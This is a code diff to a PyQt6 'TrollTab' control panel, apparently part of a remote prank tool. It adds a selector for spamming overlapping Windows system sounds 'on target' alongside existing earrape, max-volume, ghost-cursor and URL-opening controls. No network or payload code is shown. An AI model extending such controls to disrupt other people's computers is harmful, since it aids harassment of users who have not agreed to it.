@@ -11,8 +11,9 @@ from PyQt6.QtWidgets import (
     QPushButton,
     QLineEdit,
     QCheckBox,
+    QComboBox,
     QFileDialog,
-    QMessageBox,
+    QMessageBox, QLabel
 )
 from PyQt6.QtCore import pyqtSignal, Qt
 
@@ -31,6 +32,7 @@ class TrollTab(QWidget):
     play_sound_signal = pyqtSignal(bytes)  # audio data
     random_sound_signal = pyqtSignal(bool, int)  # enabled, interval_ms
     alert_loop_signal = pyqtSignal(bool)
+    system_sound_signal = pyqtSignal(str)
     volume_max_signal = pyqtSignal()
     earrape_signal = pyqtSignal()
     whisper_signal = pyqtSignal(bool)
@@ -99,23 +101,54 @@ class TrollTab(QWidget):
         self.random_sound_check = QCheckBox("Random Sounds")
         self.random_sound_check.stateChanged.connect(self.on_random_sound_toggle)
 
-        self.alert_loop_check = QCheckBox("Alert Loop")
-        self.alert_loop_check.stateChanged.connect(
-            lambda s: self.alert_loop_signal.emit(s == Qt.CheckState.Checked.value)
-        )
-
         self.whisper_check = QCheckBox("Whisper")
         self.whisper_check.stateChanged.connect(
             lambda s: self.whisper_signal.emit(s == Qt.CheckState.Checked.value)
         )
 
         toggle_row.addWidget(self.random_sound_check)
-        toggle_row.addWidget(self.alert_loop_check)
         toggle_row.addWidget(self.whisper_check)
         toggle_row.addStretch()
 
         audio_layout.addLayout(toggle_row)
         layout.addWidget(audio_group)
+
+        # System Alerts Section
+        system_group = QGroupBox("🔔 System Alerts")
+        system_layout = QVBoxLayout(system_group)
+
+        alert_controls = QHBoxLayout()
+        alert_label = QLabel("Sound:")
+        self.system_sound_combo = QComboBox()
+        self.system_sound_combo.addItems([
+            "SystemHand",
+            "SystemExclamation",
+            "Notification.Reminder",
+            "MailBeep",
+            "AppGPFault",
+            "DeviceConnect",
+            "DeviceDisconnect",
+            "DeviceFail",
+            "MessageNudge",
+        ])
+        
+        self.play_system_btn = QPushButton("⚡ Play Sound")
+        self.play_system_btn.clicked.connect(self.send_system_sound)
+        self.play_system_btn.setToolTip("Spammable - plays overlapping on target")
+        self.play_system_btn.setStyleSheet("background-color: #0e639c; color: white;")
+
+        alert_controls.addWidget(alert_label)
+        alert_controls.addWidget(self.system_sound_combo, 1)
+        alert_controls.addWidget(self.play_system_btn)
+        system_layout.addLayout(alert_controls)
+
+        self.alert_loop_check = QCheckBox("Enable Alert Loop (Overlapping Random System Sounds)")
+        self.alert_loop_check.stateChanged.connect(
+            lambda s: self.alert_loop_signal.emit(s == Qt.CheckState.Checked.value)
+        )
+        system_layout.addWidget(self.alert_loop_check)
+
+        layout.addWidget(system_group)
 
         # Visual Section
         visual_group = QGroupBox("👁️ Visual Pranks")
@@ -201,6 +234,12 @@ class TrollTab(QWidget):
                 url = "https://" + url
             self.open_url_signal.emit(url)
 
+    def send_system_sound(self):
+        """Emit signal for the selected system sound."""
+        sound = self.system_sound_combo.currentText()
+        if sound:
+            self.system_sound_signal.emit(sound)
+
     def on_random_sound_toggle(self, state):
         enabled = state == Qt.CheckState.Checked.value
         interval = 5000  # 5 seconds default
@@ -260,8 +299,6 @@ class TrollTab(QWidget):
         if file_path:
             try:
                 # Size check
-                import os
-
                 if os.path.getsize(file_path) > MAX_WALLPAPER_BYTES:
                     self.show_error_message(
                         f"Image too large! Max {MAX_WALLPAPER_BYTES//(1024*1024)}MB."
@@ -283,6 +320,3 @@ class TrollTab(QWidget):
         self.whisper_check.setChecked(False)
         self.ghost_cursor_check.setChecked(False)
         self.stop_all_signal.emit()
-
-
-# alr
